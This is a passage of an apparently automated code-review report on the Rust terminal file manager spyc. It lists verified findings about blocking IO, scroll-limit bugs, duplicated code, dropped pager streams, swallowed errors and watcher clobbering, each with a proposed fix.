+> verifier: confirmed: Every factual element checks out. (1) src/app/mod.rs:793 (open_help) calls crossterm::terminal::size().unwrap_or((80, 24)) directly and is reached from the Action::Help handler (actions.rs:228), graveyard.rs:43, and key_dispatch/mod.rs:491. The other listed sites all exist with the identical duplicated fallback — pane_tabs.rs:423/441/454, tasks.rs:724, git_view_session.rs:146, pane_scroll.rs:177, pager_handler/mod.rs:103/397 (9 calls total; the finding says 8 sites, a trivial count discrepancy) — and all are reached from key/action/command handler paths (zoom toggle, pane_spawn_size …
+
+### `src/app/navigate.rs:160` — gF reads an attacker-controlled path fully into memory synchronously on the input thread (hang/OOM via hostile pane content)
+`medium` · `security` · `app-input` · **confirmed**
+
+`goto_file_navigate` resolves a path reference scraped from untrusted pane output via `extract_path_ref`, then for `gF` calls `std::fs::read_to_string(&path)` (line 160) on the main input/render thread, buffering the entire file before building the pager view. The path comes entirely from pane content the user does not control (agent output, a file they `cat`, a malicious repo). If the extracted path resolves to a FIFO, `/dev/zero`, `/dev/random`, or simply a multi-gigabyte file, `read_to_string` blocks forever or exhausts memory, freezing the whole TUI. This is exactly the 'blocking IO on the render/input path' class the project treats as a hard regression. The cwd-relative resolution already confirms the path exists, so device files and pipes under `/dev` qualify.
+
+**Fix:** Cap the read (open the file and read at most N bytes / reject non-regular files via `metadata().is_file()` and a size check), and/or move the read into a `ReadFile` effect handled off the input thread like the other PagerStream/ReadPaneText paths.
+
+> verifier: confirmed: Verified all elements of the finding against the code. (1) navigate.rs:160 does call std::fs::read_to_string(&path) uncapped, with no is_file()/size/text check; the path comes from extract_path_ref (src/pane/pathref.rs:52) whose only gate is resolved.exists(), so FIFOs and device files like /dev/zero qualify (directories are diverted at navigate.rs:136, but non-dir special files fall through to the gF read). (2) The read is synchronous on the main event-loop/input thread: gF emits Effect::ReadPaneText{then: GotoFile}, and run_effects (src/app/effect.rs:379-384, comment says "synchro …
+
+### `src/app/pager_handler/mod.rs:218` — Top-overlay pty spawn block copy-pasted at three sites
+`medium` · `maintainability` · `app-pager` · **confirmed**
+
+The same ~15-line sequence — format the command with shell_quote, compute Self::top_overlay_size(self.effective_pane_pct(), pane_tabs.is_some()), clone listing.dir, make_pane_wake(), Pane::spawn(...), Ok => { runtime.top_overlay = Some(p); state.focus = Focus::Overlay } / Err => flash_error("spawn: {e}") — appears verbatim in three places: edit_in_pane (pager_handler/mod.rs:218-233), spawn_pager_overlay_for_path (pager_handler/mod.rs:491-506), and the `v`-from-TopPane branch of handle_pager_motion (pager_handler/motion.rs:258-276). Any future change to overlay sizing, wake plumbing, or focus assignment must be edited in three places. Note also that spawn_pager_overlay_for_path is `pub` but its only caller is display_in_pane in the same file (mod.rs:270).
+
+**Fix:** Extract a single helper, e.g. `fn spawn_top_overlay_cmd(&mut self, cmd: &str)` holding the size/cwd/wake/spawn/focus/error-flash sequence; the three call sites then only build the command string (editor vs pager vs explicit path). Make spawn_pager_overlay_for_path private (or fold it into the helper) since it has no external callers.
+
+> verifier: confirmed: Verified all three cited sites read as claimed: pager_handler/mod.rs:218-233 (edit_in_pane), mod.rs:491-506 (spawn_pager_overlay_for_path), and motion.rs:258-276 (v-from-TopPane) each contain the same shell_quote-cmd / top_overlay_size(effective_pane_pct, pane_tabs.is_some()) / listing.dir.clone() / make_pane_wake() / Pane::spawn / Ok=>top_overlay+Focus::Overlay / Err=>flash_error("spawn: {e}") sequence. spawn_pager_overlay_for_path is pub with exactly one caller (display_in_pane, mod.rs:270, same file). The finding is in fact understated: grep shows two additional verbatim copies a …
+
+### `src/app/pager_handler/mod.rs:311` — Files under 5 MB but over 65,535 lines load fully yet are unscrollable past line 65,536 (u16 scroll saturation)
+`medium` · `correctness` · `app-pager` · **confirmed**
+
+`build_pager_view_for_file` only triggers the truncated/`MAX_PAGER_LINES` path when `file_size > MAX_PAGER_BYTES` (5 MB); below that it does a plain `std::fs::read_to_string` with no line cap (mod.rs:308-315). `PagerView::scroll` is `u16` (ui/pager/mod.rs:141) and `scroll_max`/`line_count` saturate via `u16::try_from(...).unwrap_or(u16::MAX)` (ui/pager/scroll_search.rs:62, 97-98). A 3-4 MB log/CSV with short lines easily exceeds 65,535 lines (e.g. 4 MB at ~40 bytes/line ≈ 100k lines): it opens without any truncation banner, but `G`, `:N`, `^f`, and `/` matches past line 65,535 are unreachable — the view silently pins at line 65,535 and the user has no indication the tail exists (unlike the >5 MB case, which gets the explicit "press p for $PAGER" banner).
+
+**Fix:** Either widen `PagerView.scroll` (and the scroll math) to `u32`/`usize`, or apply the existing `read_truncated`/banner path when the line count exceeds `u16::MAX` (or a new `MAX_PAGER_DISPLAY_LINES`), so the user gets the same explicit truncation + `p` escape hatch instead of a silent cap.
+
+> verifier: confirmed: Verified against the code. (1) src/app/pager_handler/mod.rs:308-315: files <= MAX_PAGER_BYTES (5 MB, src/fs/ops.rs:32) are loaded via plain read_to_string with no line cap and truncated=false, so the "⚠ truncated" title and "press p to open in $PAGER" banner (mod.rs:419-449) never appear. (2) PagerView.scroll is u16 (src/ui/pager/mod.rs:141); scroll_max/line_count saturate via u16::try_from(...).unwrap_or(u16::MAX) (src/ui/pager/scroll_search.rs:62, 97-98); the renderer starts at `view.scroll as usize` (src/ui/pager/render.rs:125). Every navigation path hits the cap: G uses the satu …
+
+### `src/app/pager_handler/pickers.rs:198` — History-editor cursor-sync logic duplicated four times despite an existing shared helper
+`medium` · `maintainability` · `app-pager` · **confirmed**
+
+App::sync_hist_editor (src/app/session.rs:406-422) already implements "compute hist index from picker_cursor, set_content_keep_mode, rewrite the display line with HIST_PREFIX_W, set picker_edit_cursor" — and it is reachable via the public sync_history_editor_to_cursor (called from modes.rs:149). Yet the identical body is re-implemented as the local sync_editor! macro (pickers.rs:198-209), inlined again in the Ctrl+D delete branch (pickers.rs:177-191), again (with set_content instead of set_content_keep_mode) in the HistoryPrev/HistoryNext branch (pickers.rs:327-336), and a fourth time in the search-commit Enter arm of handle_pager_search_typing (modes.rs:82-97). The format string `"  {:>3}  {}"` and the HIST_PREFIX_W cursor math must stay byte-identical across five locations or the editor cursor visibly desyncs from the rendered line.
+
+**Fix:** Route all sites through Self::sync_hist_editor / sync_history_editor_to_cursor (ending the local `view`/`editor` borrows first — the helper re-derives both from self.view, which is exactly why it was written as a static fn over the two Options). Add a set_content (non-keep-mode) flag or sibling for the HistoryPrev/Next variant, then delete the sync_editor! macro.
+
+> verifier: confirmed: Verified against the code. The shared helper App::sync_hist_editor (src/app/session.rs:406-422) implements exactly the described sequence (hist index from picker_cursor, set_content_keep_mode, rewrite line with format!("  {:>3}  {}"), set picker_edit_cursor = HIST_PREFIX_W + cursor) and is reachable via the public sync_history_editor_to_cursor, already called from modes.rs:149. The identical body is duplicated at all four cited sites: (1) the sync_editor! macro at pickers.rs:198-209 (byte-identical, used 7x in the Normal-mode arms); (2) the Ctrl+D delete branch at pickers.rs:181-189 …
+
+### `src/app/pager_stream.rs:228` — Opening pager help (`?`) or navigating buffer history (`[b`/`]b`) while a stream is mid-flight kills the worker and permanently freezes the pager at "scanning…"/"computing…"
+`medium` · `correctness` · `app-pager` · **confirmed**
+
+`drain_pager_stream` drops the stream whenever neither live slot holds its `stream_id` (pager_stream.rs:228-231). Two key handlers move a streaming pager out of the live slot without parking the stream: (1) motion.rs:336-339 — `?` stashes `view.pager` into `pager_help_stash` and replaces it with the help pager; (2) modes.rs:179/196 — `[b`/`]b` move the current pager onto the history stacks. The drain runs every loop iteration (run.rs:479), so the very next iteration drops `runtime.pager_stream`, the worker dies on its next send, and when the user dismisses help (or `]b`s back) the restored pager is frozen forever: a `:grep` stuck at "— N matches — scanning…" with `streaming=true` (so Esc also refuses to save it to history, motion.rs:91), or a git diff/show stuck at an empty "… — computing…" pager that looks like a hang and never completes. Contrast with the tab-switch path, which carefully parks the stream in `runtime.stashed_pager_streams` keyed by id (pane_scroll.rs:78-87) precisely to avoid this drop; the help-stash and bracket-nav paths have no such parking.
+
+**Fix:** Either park the active stream into `stashed_pager_streams` (mirroring `stash_scrollback_pager_to_active_tab`) whenever its backing pager moves to `pager_help_stash` or `pager_history`, restoring it when the pager returns to the live slot; or, more cheaply, block `?` and `[b`/`]b` while `view.streaming` is true (flash "wait for the scan to finish").
+
+> verifier: confirmed: Every load-bearing claim verified against the code (paths are under src/app/pager_handler/, not src/app/, but the cited line numbers match):
+
+1. Drop mechanics confirmed. `drain_pager_stream` (src/app/pager_stream.rs:219-231) drops `runtime.pager_stream` whenever `stream_slot(id)` returns None, and `stream_slot` (pager_stream.rs:292-310) checks ONLY the two live slots `view.scroll_pager` and `view.pager` — it does not look in `pager_help_stash` or `pager_history`. The drain runs every loop iteration (src/app/run.rs:479), so one iteration after the pager leaves a live slot, the strea …
+
+### `src/app/pane_scroll.rs:179` — Single `runtime.pager_stream` slot: starting a grep/git-view while a transcript is loading silently kills the transcript stream, leaving the scroll pager empty forever
+`medium` · `correctness` · `app-proc` · **confirmed**
+
+`spawn_pager_stream` (pager_stream.rs:159) does `self.runtime.pager_stream = Some(build(id, rx))`, unconditionally overwriting any in-flight stream. Concrete scenario: `^a v` on a Claude pane with a large transcript mounts an empty LowerPane pager (`streaming=true`, `stream_id=N`) into `view.scroll_pager` while the worker reads/renders off-thread; the user presses `^W k` (meta escapes to the resolver) and runs `:grep foo` (or `|` git-view). The Overlay stream replaces the TranscriptStream in `runtime.pager_stream`; the transcript's rendered lines are dropped on the floor (the receiver is gone), and `drain_pager_stream`'s id-gate only checks the live stream, so the still-mounted transcript pager keeps `streaming=true` with a dead `stream_id` and stays empty indefinitely. The only recovery is knowing to press `r` in it. The stash path (pane_scroll.rs:78-87) only parks the stream when ids match, so it doesn't help.
+
+**Fix:** Before overwriting in `spawn_pager_stream`, park the existing stream into `runtime.stashed_pager_streams` keyed by its id when its pager is still mounted (the same mechanism tab-switch stashing uses), and have `drain_pager_stream` pull a parked stream back when its pager is the visible one; or make `runtime.pager_stream` a small id-keyed map.
+
+> verifier: confirmed: The finding holds as stated. (1) Mechanism verified: pager_stream.rs:159 unconditionally overwrites runtime.pager_stream; dropping the old TranscriptStream drops its Receiver, the transcript worker's `let _ = tx.send(lines)` (pane_scroll.rs:186) fails silently, and the rendered lines are lost. drain_pager_stream only id-gates the live stream (stream_slot is called with the live stream's id only), so the still-mounted view.scroll_pager keeps streaming=true with a dead stream_id and is never filled or cleaned up. (2) Reachable: route.rs's own regression test `lower_pane_pager_non_meta …
+
+### `src/app/pane_scroll.rs:239` — mount_scroll_pager duplicates mount_stream_pager's LowerPane arm flag-for-flag
+`medium` · `maintainability` · `app-proc` · **confirmed**
+
+`mount_scroll_pager` (pane_scroll.rs:239-264) and the `PagerStreamMount::LowerPane` arm of `mount_stream_pager` (pager_stream.rs:184-208) are near-identical ~20-line blocks: both call `tabs.active_mut().enter_scroll_mode()`, set `Mount::LowerPane`, `pane_scroll = true`, `show_line_numbers = false`, `no_history = true`, `wrap = true`, `pending_scroll_to_bottom.set(true)`, assign `self.view.scroll_pager`, set `Focus::Pane`, `needs_full_repaint = true`, and flash the same "scroll: on (/, n/N, :N, V, y, Esc exit)" string. The pager_stream copy even admits it "Mirrors the vt100 `mount_scroll_pager` setup." The only real deltas are `stream_id`/`streaming` and pre-built lines vs empty. Any future tweak to the scroll-pager mount (a new flag, a changed hint string) must now be made twice, and the two copies have already started to drift cosmetically.
+
+**Fix:** Extract one shared mount helper, e.g. `fn mount_lower_scroll_pager(&mut self, title: String, lines: Vec<Line>, stream_id: Option<u32>)`, and have both call sites use it.
+
+> verifier: confirmed: Verified line-by-line: pane_scroll.rs:239-264 and pager_stream.rs:184-208 are near-identical ~20-line mount blocks performing the same 11-step setup (enter_scroll_mode, new_styled, Mount::LowerPane, pane_scroll, show_line_numbers=false, no_history, wrap, pending_scroll_to_bottom, scroll_pager slot, Focus::Pane, needs_full_repaint, identical flash string "scroll: on (/, n/N, :N, V, y, Esc exit)"). The only deltas are stream_id/streaming and empty-vs-prebuilt lines, exactly as the finding states. The self-admission exists at pager_stream.rs:120-122 ("Mirrors the vt100 `mount_scroll_pa …
+
+### `src/app/pane_scroll.rs:304` — `r` reload branch in handle_pane_scroll_key checks the wrong pager slot and is dead for its stated purpose
+`medium` · `maintainability` · `app-proc` · **confirmed**
+
+The branch at src/app/pane_scroll.rs:304-314 is commented "`r`: reload a transcript scroll pager" and gates on `self.view.pager.as_ref().is_some_and(|p| p.stream_id.is_some())`. But the transcript scroll pager mounts into `self.view.scroll_pager`, not `view.pager` (pager_stream.rs:203, `mount_stream_pager`'s LowerPane arm). Moreover, whenever a scroll pager is open, key routing never reaches this handler: route.rs:184 (arm 2b, `has_scroll_pager && bottom_owns`) returns `InputSink::PagerKey` before arm 3's `PaneScroll`, and the working `r` reload already lives there (pager_handler/motion.rs:343, gated on `view.pane_scroll`). So this branch can never fire for a transcript pager; the only way it can fire is the pathological combination "pane stuck in scroll mode with no scroll pager + a top-region stream pager (grep/git-view) open", in which case it would spuriously call `open_pane_scroll_pager()`. It is leftover from before the `view.pager`/`view.scroll_pager` two-slot split, with a comment describing behavior that moved elsewhere.
+
+**Fix:** Delete the branch (the real reload is pager_handler/motion.rs:343). If a reachable case is believed to exist, fix the guard to check `self.view.scroll_pager` and add a route test demonstrating how `InputSink::PaneScroll` can be reached with a stream-backed pager open.
+
+> verifier: confirmed: Every element of the finding checks out. (1) The branch at src/app/pane_scroll.rs:304-314 does gate on view.pager's stream_id, while transcript scroll pagers mount into view.scroll_pager (pager_stream.rs:203 LowerPane arm; pane_scroll.rs:259 vt100 path). (2) handle_pane_scroll_key's sole caller is the InputSink::PaneScroll arm (key_dispatch/mod.rs:172), and route_input's arm 2b (route.rs:184, has_scroll_pager && bottom_owns && !is_meta) returns PagerKey before arm 3's PaneScroll (route.rs:191), so the handler is never reached while a scroll pager is open; the live reload is pager_ha …
+
+### `src/app/prompt.rs:450` — dispatch_prompt/cancel_prompt unconditionally wipe temp_filter, destroying an active `=`/:limit filter on any prompt
+`medium` · `correctness` · `app-input` · **confirmed**
+
+dispatch_prompt (lines 450-454) clears `self.state.temp_filter` at the top of EVERY prompt submission, and cancel_prompt (lines 433-436) does the same on every cancel. The comments say the intent is to clear 'any Tab-applied filter', but temp_filter is the same slot that holds a deliberately-applied `=h` / `= *.rs` / `:limit` filter (set in src/app/state/dispatch.rs:319-341 and 45-58). Concrete failure: apply `=h` (harpoon-only listing), then press `/`, type a search, hit Esc (or Enter) — the harpoon filter silently vanishes and the full listing returns. Same for `!cmd`, `:sort`, mkdir, etc. The harpoon reconcile code in actions.rs (lines 54-67) goes out of its way to keep `=h` filters alive across actions, so persistent filters are clearly the intended semantics; the prompt path defeats them.
+
+**Fix:** Track Tab-applied filters separately from user-applied ones (e.g. snapshot temp_filter when the prompt opens and restore that snapshot — rather than None — on cancel/submit), or add a `tab_filter: Option<String>` field so only the transient completion filter is cleared.
+
+> verifier: confirmed: Verified directly in src/app/prompt.rs: cancel_prompt (433-436) and dispatch_prompt (451-454) unconditionally clear state.temp_filter and rebuild rows on every prompt cancel/submit, regardless of PromptKind. temp_filter is the single shared slot for deliberate `=`/`:limit` filters (state/dispatch.rs:38-58, 316-343) and the transient Tab-completion filter (key_dispatch/prompts.rs:82, prompt.rs:243); grep confirms no snapshot/restore or guard anywhere else. The failure is reachable exactly as described: with `=h` active, pressing `/` then Esc routes to cancel_prompt (key_dispatch/prom …
+
+### `src/app/prompt.rs:590` — J jump prompt silently swallows errors — typo'd path gives zero feedback
+`medium` · `correctness` · `app-input` · **confirmed**
+
+PromptKind::Jump submission does `let _ = self.state.jump_to(trimmed);` (line 590). jump_to (src/app/state/navigation.rs:206-228) returns Err from `std::fs::canonicalize`/`metadata` when the typed path does not exist — the most common failure (a typo like `J /tpm/foo`). The error is dropped: the prompt closes and nothing happens, with no flash, leaving the user unsure whether the jump worked or the key was eaten. The same pattern exists for user-keymap jumps at src/app/key_dispatch/mod.rs:516 (`BoundAction::Jump(path) => { let _ = self.state.jump_to(path); }`). Note jump_to internally flashes chdir errors but NOT the canonicalize/metadata errors, so this is a genuine gap, not double-reporting.
+
+**Fix:** Match on the Result and flash the error, e.g. `if let Err(e) = self.state.jump_to(trimmed) { self.state.flash_error(format!("jump: {e}")); }` at both call sites (or move the flash into jump_to so all callers get it).
+
+> verifier: confirmed: Verified against the actual code; every element of the finding holds.
+
+1. The code does what the finding claims. /Users/derekmarshall/src/spyc/src/app/prompt.rs:590 is exactly `let _ = self.state.jump_to(trimmed);` inside the PromptKind::Jump submission arm — the Result is discarded, then `reconcile_harpoon()` runs and the arm returns `Vec::new()` (no flash effect). The second site is exactly as cited: /Users/derekmarshall/src/spyc/src/app/key_dispatch/mod.rs:516, `BoundAction::Jump(path) => { let _ = self.state.jump_to(path); }`.
+
+2. The failure is reachable and unguarded. `jump_to …
+
+### `src/app/render/chrome.rs:96` — Divider width accounting mixes UTF-8 byte lengths with terminal columns
+`medium` · `maintainability` · `app-render` · **confirmed**
+
+`render_pane_status_line` budgets the line with byte lengths throughout: `tab_len = sep.len() + tab_text.len()` where `sep` is "─" (3 bytes, 1 column), the bg-task glyphs ● ✓ ✗ ⏸ are 3 bytes/1 column each (`bg_width += text.len()`, line 184), and `used += cwd_fragment.len()` (line 130) counts the 3-byte "…" ellipsis and any multibyte path chars as 3+ columns. Since `fill = width.saturating_sub(used + tag_len + bg_width)` (line 189) is computed from these inflated counts, the dash fill comes up short by exactly the byte-vs-column overhead — with even one pane tab the right-anchored bg-tags/[ZOOM]/[SCROLL] group ends ~2+ columns left of the right edge, and the gap grows with tabs and bg tasks. The codebase already has the correct helper: `crate::ui::display_width` is used for exactly this in overlays.rs:237.
+
+**Fix:** Replace every `.len()` used for layout budgeting in this function with `crate::ui::display_width(...)` (the seps can be a constant 1). This also makes the line-truncation guards (`used + tab_len > width`, the `avail` computation) correct for wide glyphs.
+
+> verifier: confirmed: Every factual element of the finding checks out against /Users/derekmarshall/src/spyc/src/app/render/chrome.rs, and the issue is reachable in the common case.
+
+1. The code does what the finding claims. Line 96: `tab_len = sep.len() + tab_text.len()` where `sep` is "─" (verified 3 UTF-8 bytes, 1 terminal column) — +2 columns of overcount per rendered tab. Line 130: `used += cwd_fragment.len()` where `cwd_prefix` is "── " (7 bytes / 3 cols, +4) or "── ↪ " (11 bytes / 5 cols, +6), plus the "…" ellipsis (3 bytes / 1 col, +2) and any multibyte path chars from `display_tilde`. Line 184: ` …
+
+### `src/app/render/chrome.rs:320` — build_rows is O(rows × delete-preview paths) — quadratic on 'delete picks' in a big directory
+`medium` · `perf` · `app-render` · **unverified**
+
+In `build_rows`, every row evaluates `delete_preview.is_some_and(|v| v.iter().any(|p| p == &rd.path))` — a linear scan of the pending-delete preview Vec per row, so the rebuild is O(rows × preview). `pending_delete_preview` is populated with ALL selected paths (src/app/state/apply.rs:301-302), so pick-all in a 50k-file directory then `dd` makes the confirm-prompt frame's row rebuild do 2.5×10^9 PathBuf comparisons (each a full path-component compare) — a multi-second main-thread stall before the y/N prompt even paints, scaling quadratically with directory size. The cost repeats on every `list_generation` bump while the preview is alive.
+
+**Fix:** Build a `HashSet<&Path>` (or sort + binary-search) from the preview once before the `.map()` over rows, making the per-row check O(1): `let preview_set: Option<HashSet<&Path>> = delete_preview.map(|v| v.iter().map(PathBuf::as_path).collect());`.
+
+### `src/app/run.rs:54` — Config-file watch on $HOME is permanently destroyed when the listing watch passes through the same directory
+`medium` · `correctness` · `app-loop` · **confirmed**
+
+run_setup watches each config candidate's parent directory (candidate_config_paths in config.rs:39 always includes $HOME for ~/.spycrc.toml), via `let _ = w.watch(parent, RecursiveMode::NonRecursive)` at run.rs:54. The same notify watcher instance is then used by sync_listing_watch (sources.rs:385-410), which on every chdir does `w.unwatch(old)` on the previous listing dir. notify watchers keep one watch per path with no refcounting: if the user navigates the listing into $HOME (the second watch() on $HOME just replaces the first) and then navigates away, the unwatch($HOME) removes the only watch — including the config-parent watch installed at startup. Simplest repro: launch spyc with cwd == $HOME, navigate into any subdirectory; from then on, edits to ~/.spycrc.toml never fire FsEvent, so config hot-reload (needs_reload in ingest_fs_event) is silently dead for the rest of the session. Same applies on both Linux (inotify) and macOS (FSEvents) backends.
+
+**Fix:** Make sync_listing_watch aware of the config-parent set: skip the unwatch when the old listing dir is one of the config parents (re-watch it NonRecursive instead), or track watched paths with a refcount/owner tag so the listing watch and config watch on the same directory don't clobber each other.
+
+> verifier: confirmed: Every element of the finding holds against the code and the vendored notify 6.1.1 source. (1) config.rs:41-43 always yields $HOME/.spycrc.toml, so run.rs:48-56 watches $HOME NonRecursive on the shared watcher; (2) run.rs:632-641 calls sync_listing_watch (sources.rs:385-388) on every chdir, which does w.unwatch(old) on the previous listing dir with no knowledge of config parents, and nothing in the repo ever re-watches them (already_watched is run_setup-local); (3) notify 6.1.1 has no refcounting on either backend — inotify keeps one HashMap entry per path (second watch overwrites, r …
+
+### `src/app/session.rs:119` — save_session ignores the write result but reports "session saved" in the exit summary
+`medium` · `correctness` · `app-proc` · **confirmed**
+
+`let _ = crate::state::sessions::save_session(&session);` drops any persistence failure (read-only/unwritable state dir, disk full, ENOSPC), then the code unconditionally builds `parts = vec![format!("session saved — {cwd_display}")]` plus "restore with spyc -r" and sets `self.exit_summary`. The user quits believing their tabs and agent session ids were persisted; `spyc -r` later has no such session and there is no trace of why. For daily drivers whose claude conversations are recovered via this path, the silent loss is exactly the failure class the error-handling lens targets: a dropped Result the user must see.
+
+**Fix:** Match on the save result; on Err set `exit_summary` to `session save FAILED: {e}` (and skip the per-agent summary lines), so the post-TUI output tells the truth.
+
+> verifier: confirmed: The claim holds exactly as stated, verified end-to-end.
+
+(1) Code does what the finding claims. /Users/derekmarshall/src/spyc/src/app/session.rs:119 is literally `let _ = crate::state::sessions::save_session(&session);`. The callee (/Users/derekmarshall/src/spyc/src/state/sessions/mod.rs:97) returns `std::io::Result<()>` and can fail at three points: `std::fs::create_dir_all(&dir)?`, `serde_json::to_string_pretty(...).map_err(io::Error::other)?`, and `std::fs::write(&path, json)?`. Immediately after the dropped Result, session.rs:124-167 unconditionally builds `parts = vec![format!( …
+
+### `src/app/sources.rs:293` — Watcher-driven `refresh_listing` does a synchronous 50k-entry disk walk + allocation-heavy sort on the event-loop thread
+`medium` · `perf` · `app-loop` · **confirmed**
+
+The debounce in `ingest_fs_and_maybe_refresh` (called from src/app/run.rs:511) fires `self.state.refresh_listing()` inline on the main thread. That calls `Listing::read` (src/app/state/listing.rs:124-127 -> src/fs/listing.rs:107-130), which does `read_dir` plus a `dir_entry.metadata()` stat per entry (src/fs/entry.rs:27) up to `MAX_ENTRIES = 50_000`, then `listing.sort` (src/fs/listing.rs:138-158) whose Name/Ext comparators allocate `to_ascii_lowercase()` Strings per comparison — at 50k entries that is ~850k comparisons and ~1.7M transient String allocations per refresh. The max-defer rule in `should_fire_refresh` (src/app/mod.rs:934-950) guarantees this fires at least every 2x refresh_quiet (1 s small-tree / 6 s huge-tree) under continuous fs activity (cargo writing target/, an agent streaming files), so on a 50k-entry directory — or any directory on a cold cache / network filesystem where per-entry stats are slow — the input/render thread stalls repeatedly for tens to hundreds of ms. The git-status half of this exact path was already moved to a worker for the same reason (src/app/state/git.rs:84-100); the listing read+sort half was not.
+
+**Fix:** Precompute the lowercase sort key once per Entry (store it on `Entry` or sort_by_cached_key) to kill the O(n log n) allocation churn, and move the `Listing::read` walk onto a worker thread like the git status read — post the result back as a Message and apply generation-gated, keeping the main loop non-blocking.
+
+> verifier: confirmed: Every sub-claim verifies against the code. (1) src/app/sources.rs:293 fires self.state.refresh_listing() inline, pre-recv, in the single-threaded App::run loop (src/app/run.rs:511) — the same thread that handles input and rendering. (2) refresh_listing (src/app/state/listing.rs:124) → Listing::read → read_capped (src/fs/listing.rs:107-130) does read_dir plus a dir_entry.metadata() stat per entry (src/fs/entry.rs:27) capped at MAX_ENTRIES = 50_000, then unconditionally sorts; the Name comparator allocates to_ascii_lowercase() Strings per comparison (src/fs/listing.rs:140-143), ≈780k  …
+
+### `src/app/state/apply.rs:320` — format_long_listing and file_type_label do per-file IO inside the pure apply dispatcher
+`medium` · `maintainability` · `fs` · **unverified**
+
+Action::LongList calls fs::long_listing::format_long_listing (one fs::symlink_metadata per path, long_listing.rs:71, plus uzers passwd/group lookups) and Action::FileType calls fs::ops::file_type_label (fs::symlink_metadata plus File::open + 512-byte read per path, ops.rs:229-263) directly inside AppState::apply (apply.rs:320, 339, 353). Bounded by selection size so it won't hang like the Remove walk, but it is the same contract drift: OS access inside the function the architecture docs declare pure, and it makes those arms untestable without a real filesystem. The ApplyResult::OpenPager(PagerRequest) seam already exists precisely so the impure caller can do this work.
+
+**Fix:** Have these arms return the selected paths in the ApplyResult (a new PagerRequest/PostAction variant carrying paths), and run format_long_listing / file_type_label in the impure handler or as an Effect, keeping apply free of fs calls.
+
+### `src/app/state/dispatch.rs:45` — :limit command and limit-prompt are drifted near-duplicates
+`medium` · `maintainability` · `app-mvu-state` · **confirmed**
+
+The `:limit <pat>` arm (dispatch.rs:45-59) and the `PromptKind::Limit` arm (dispatch.rs:316-345) implement the same feature with diverged logic. The prompt path aliases `harpoon`→`h` and `g`→`git`, and guards both special filters (`harpoon_filter_set.is_empty()` / `git.files.is_empty()`) with explanatory error flashes. The command path has none of that: `:limit h` and `:limit git` happen to activate the special filters (because `apply_temp_filter` in listing.rs:94-115 keys on the literal stored strings) but skip the empty-set guards and flash the generic "limit: h" / "limit: git" text, while `:limit g` and `:limit harpoon` silently become literal substring filters instead of the special filters — different behavior from the identical input at the prompt.
+
+**Fix:** Extract one shared `fn set_limit_filter(&mut self, pattern: &str)` on AppState containing the alias table, the empty-set guards, the flash strings, and the rebuild; call it from both dispatch_command's `limit` arm and dispatch_prompt's `Limit` arm.
+
+> verifier: confirmed: Every specific claim in the finding checks out against the code.
+
+1. The two arms exist and are drifted near-duplicates. The `:limit <pat>` arm (/Users/derekmarshall/src/spyc/src/app/state/dispatch.rs:45-59) handles only the empty/`!` cases and otherwise stores the pattern literally with a generic `flash_info("limit: {pat}")`. The `PromptKind::Limit` arm (dispatch.rs:316-345) additionally aliases `harpoon`→`h` and `g`→`git`, guards the harpoon path with `harpoon_filter_set.is_empty()` → "harpoon empty (or PROJECT_HOME unset) — nothing to filter", guards the git path with `git.files. …
+
+### `src/app/state/listing.rs:111` — Git status lookups keyed by display name never match executable files
+`medium` · `correctness` · `app-mvu-state` · **confirmed**
+
+git.files is produced by git::status::map_to_listing (src/git/status.rs:112), which keys file entries by plain basename (e.g. "build.sh") and subtree dirs by "name/". But every consumer looks the map up by RowData.display, which Entry::display_name() (src/fs/entry.rs:66) decorates with a trailing '*' for EntryKind::Executable. So for any tracked file with the +x bit (shell scripts are everywhere in repos), the lookup key is "build.sh*" while the map key is "build.sh" — a guaranteed miss. Concrete failures: (1) apply_temp_filter's "git" branch (src/app/state/listing.rs:111) silently omits modified executables from `:limit git`; (2) jump_to_git_change (src/app/state/navigation.rs:80) skips them for `]g`/`[g`; (3) the render lookup (src/app/render/chrome.rs:316) never paints a `~`/`+` marker on them. Dirs happen to match because both sides append '/', which hides the asymmetry. A user with a modified, staged-or-not executable script sees it as clean.
+
+**Fix:** Key the lookups by the entry's raw name rather than the decorated display: carry `name` on RowData (or strip a trailing '*'/keep '/' in one shared helper) and use it at all three lookup sites, with a test covering an executable modified file.
+
+> verifier: confirmed: Verified every link in the claimed chain against the actual code; the finding holds as stated.
+
+Map keys (producer): /Users/derekmarshall/src/spyc/src/git/status.rs `map_to_listing` (line 112) keys in-this-dir files by plain basename via `Path::file_name()` (lines 131-134, 147-148) — git porcelain paths never carry a `*`. Subtree dirs get `format!("{top_component}/")` (lines 162-163).
+
+Lookup keys (consumers): RowData.display is built by `row_from_entry` (/Users/derekmarshall/src/spyc/src/app/mod.rs:1034-1040) from `Entry::display_name()` (/Users/derekmarshall/src/spyc/src/fs/entry. …
+
+### `src/app/state/mod.rs:84` — Update doc comment describes an abandoned migration stage as pending; three transitional result enums linger
+`medium` · `maintainability` · `app-mvu-state` · **confirmed**
+
+The `Update` doc block (mod.rs:73-89) says "producers keep their own result enums until 3C routes everything through `Update`" and "Stage 3D switches them to return `Update` directly and deletes the three" — written as future work. The MVU migration is complete, Stage 3D never landed, and the comment no longer tells a reader whether this is pending, abandoned, or deliberate. Meanwhile `ApplyResult`/`CommandResult`/`PromptResult` plus their three `From` impls (mod.rs:98-136) remain as permanent scaffolding, so every new pure handler author must pick among four overlapping result vocabularies for the same concept.
+
+**Fix:** Either finish the stated Stage 3D (producers return `Update` directly; delete the three enums and From impls — `Quit` and the marks `OpenPager` normalization fold into `Update` cleanly), or rewrite the comments to document the three-enum split as the intentional steady state and drop the roadmap framing.
+
+> verifier: confirmed: Verified directly in src/app/state/mod.rs: the Update doc block (lines 73-89) does say "producers keep their own result enums until 3C routes everything through Update" and "Stage 3D switches them to return Update directly and deletes the three, and adds the single App::update(msg) entry point" — framed as future work. The three enums ApplyResult/CommandResult/PromptResult (lines 25-71) and their From impls (lines 98-136) are still live; producers in state/dispatch.rs and state/apply.rs still return their own enums, bridged via Update::from at commands.rs:31, prompt.rs:459, actions. …
+
+### `src/app/state/selection.rs:77` — Action::Take copies file contents to disk inline inside the pure apply path
+`medium` · `maintainability` · `app-mvu-state` · **confirmed**
+
